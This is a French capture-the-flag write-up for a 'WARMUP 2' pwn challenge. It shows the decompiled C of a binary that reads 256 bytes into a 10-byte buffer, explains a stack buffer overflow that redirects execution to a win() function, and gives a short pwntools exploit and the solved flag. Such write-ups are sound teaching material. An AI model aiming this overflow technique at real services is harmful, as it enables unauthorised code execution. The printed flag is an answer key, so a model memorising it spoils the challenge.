
# WARMUP 2
> 70 points
>
> Author: W1z4rd

## Fonctionnement
Pour ce challenge, l'auteur a joint un fichier binaire que nous avons décompilé avec `ghidra`. Nous avons découvert trois fonctions appelées: `main()`, `vuln()` et `win()`.


```c
void main(EVP_PKEY_CTX *param_1)

{
  init(param_1);
  do {
    vuln();
  } while( true );
}

void vuln(void)

{
  int iVar1;
  ssize_t sVar2;
  size_t sVar3;
  char local_1f [10];
  undefined8 local_15;
  undefined local_d;
  int local_c;
  
  local_15 = 0x7365696e6f6c6f43;
  local_d = 0;
  puts("###                              ###");
  puts("###         Welcome              ###");
  puts("###      Haclerkab 2023          ###");
  puts("###                              ###");
  puts("###                              ###");
  putchar(10);
  printf("What\'s your Pseudo?: ");
  sVar2 = read(0,local_1f,0x100);
  local_c = (int)sVar2;
  local_1f[local_c + -1] = '\0';
  sVar3 = strlen((char *)&greeting);
  write(0,&greeting,sVar3);
  sVar3 = strlen(local_1f);
  write(0,local_1f,sVar3);
  sVar3 = strlen((char *)&exclamation);
  write(0,&exclamation,sVar3);
  iVar1 = strncmp((char *)&local_15,"danhomey",8);
  if (iVar1 == 0) {
    win();
  }
  return;
}

void win(void)

{
  puts("Kudos. Great !!!!");
  system("/usr/bin/cat flag.txt");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
Le programme exécute indéfiniment la fonction vuln() dans sa fonction principale. Après l'affichage de la bannière, la fonction vuln() demande d'entrer une chaine de caractères à travers la fonction `read()` et stocke les données dans local_1f. La taille maximale lue est de 0x100 (256) octets. Elle utilise `write()` pour afficher trois chaînes de caractères : `greeting`, l'entrée utilisateur `local_1f`, et `exclamation`, définies ailleurs. Elle effectue ensuite une comparaison entre les 8 premiers caractères de la chaîne stockée dans local_15 et la chaîne "danhomey". Si la comparaison est vraie (c'est-à-dire si les 8 premiers caractères de local_15 sont égaux à "danhomey"), la fonction win() est appelée.

Ah on constate que la fonction `win()` est chargée d'afficher notre flag dans le fichier flag.txt du répertoire courant! 

## Solution

Pour obtenir notre flag, il nous faut bypasser le contrôle effectué avant et passer directement à l'exécution de la fonction `win()`. La première idée qui nous est venue à l'esprit est d'exploiter une vulnérabilité buffer overflow en abusant de l'entrée utilisateur. Et cela se confirme faisable étant donné que local_1f est de 10 octets de long et nous sommes autorisé à founir une chaine de 256 octets. Cela nous laisse une marge de 246 octets qui est largement suffisante pour écraser le contenu du registre RIP en remplaçant son contenu par l'adresse de notre fonction `win`. Il ne nous reste plus qu'à trouver le padding ([11,256]) nécessaire. 

Nous avons utilisé l'exploit suivant:
```
from pwn import *

target = remote("54.37.70.250", 3013)

target.recv()

padding = b"aaaabaaacaaadaaaeaaafaaagaaahaa"

payload = padding + p64(0x004011d9)

target.sendline(payload)
 
print(target.recv())

```

Et bingo nous avons notre flag !

<img src=File/warmup2.png >


> Flag : CTF_v4r14bl3_0v3rfl0w_r3wr1t3_!!!6Z5Z6))
